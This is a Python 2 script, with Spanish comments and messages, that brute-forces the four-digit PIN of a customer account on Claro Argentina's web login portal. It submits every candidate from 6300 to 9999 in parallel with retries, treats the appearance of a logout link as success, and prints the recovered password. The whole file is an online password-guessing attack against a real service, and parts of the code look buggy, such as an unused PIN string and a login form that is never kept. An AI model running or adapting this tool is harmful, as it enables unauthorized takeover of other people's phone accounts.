#!/usr/bin/env python
#-*- coding: UTF-8 -*-

import urllib2
import urllib
import cookielib
import sys
import ClientForm
from decoradores import Retry, Farm, Verbose

VERBOSE = 2
LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
    """?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view"""
    """&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0"""
    """&_58_struts_action=%2Flogin%2Flogin""")

class Get_form:
    def __init__(self):
        self.forms = {}

    @Retry(15)
    def __call__(self, formurl):
        if formurl not in self.forms:
            warning("Consiguendo un formulario")
            try:
                response = opener.open(formurl)
                forms = ClientForm.ParseResponse(response,
                    backwards_compat=False)
            except (urllib2.URLError, urllib2.HTTPError):
                return None
            self.forms[formurl] = forms
        return self.forms[formurl]


def print_dot(dot="·"):
    sys.stderr.write(dot)
    return sys.stderr.flush()


class Login:
    @Retry(10)
    def __init__(self):
        try:
            form = get_form("""http://individuos.claro.com.ar""")[0]
        except:
            return

    @Retry(15, pause=2)
    def __call__(self, loginNumber, password):
        if not password % 100:
            print_dot()

        debug("Probando con %s" % password)

        pass_str = "%04d" % password

        try:
            form["_58_login"] = loginNumber
            form["_58_password"] = password
            html = opener.open(form.click()).read()
        except (urllib2.URLError, urllib2.HTTPError):
            return None
        else:
            if '/c/portal/logout' in html:
                debug("Encontrada: %s" % password)
                return password
            elif password == "6302":
                error("Llegamos a 6302")
                return html
            elif 'servlet/Controller?EVENT=GENERAR_PIN"' in html:
                debug("No es %s" % password)
                return False
            elif 'En este momento no podemos atender tu consulta.' in html:
                debug("Sin servicio, %s" % password)
                return None
            else:
                debug("Error desconocido")
                return html


def main():
    loginNumber = sys.argv[1]

#TODO: debe verificar el servicio antes de iniciar el proceso

    farm = Farm(Login, 5, True, True)
    debug("Farm created")

    for number in xrange(6300, 10000):
        farm.enqueue((loginNumber, number))
    debug("Farm populated")

    farm.start()
    debug("Farm started")

    debug("Joining farm")
    result = farm.wait_eval()

    if result:
        print("¡La contraseña de %s es %s !" % (loginNumber, result))
        return 0
    else:
        error("No pude encontrar la contraseña :(")
        return 1


if __name__ == "__main__":
    error = Verbose(VERBOSE + 2, "E: ")
    warning = Verbose(VERBOSE + 1, "W: ")
    info = Verbose(VERBOSE + 0)
    moreinfo = Verbose(VERBOSE -1)
    debug = Verbose(VERBOSE - 2, "D: ")

    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

    get_form = Get_form()

    exit(main())
